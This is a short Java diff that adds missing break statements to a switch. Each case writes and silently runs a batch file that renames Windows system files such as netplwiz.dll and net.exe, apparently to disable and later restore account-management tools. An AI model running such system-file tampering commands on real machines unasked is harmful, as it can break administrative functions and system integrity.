@@ -41,6 +41,7 @@ public class Run implements IWriter{
           writeText("C:\\t.cmd", "ren %systemroot%\\netplwiz.dll netplwiz.dl3");
           writeBR("C:\\t.cmd");
           Runtime.getRuntime().exec(sysPath + "\\System32\\cmd.exe " + "C:\t.cmd");
+          break;
         case 2: // re
           writeText("C:\\t.cmd", "ren %systemroot%\\n1.exe net.exe");
           writeBR("C:\\t.cmd");
@@ -49,6 +50,7 @@ public class Run implements IWriter{
           writeText("C:\\t.cmd", "ren %systemroot%\\netplwiz.dl3 netplwiz.dll");
           writeBR("C:\\t.cmd");
           Runtime.getRuntime().exec(sysPath + "\\System32\\cmd.exe " + "C:\t.cmd");
+          break;
         default: // otherwise, nothing
           return;
     }
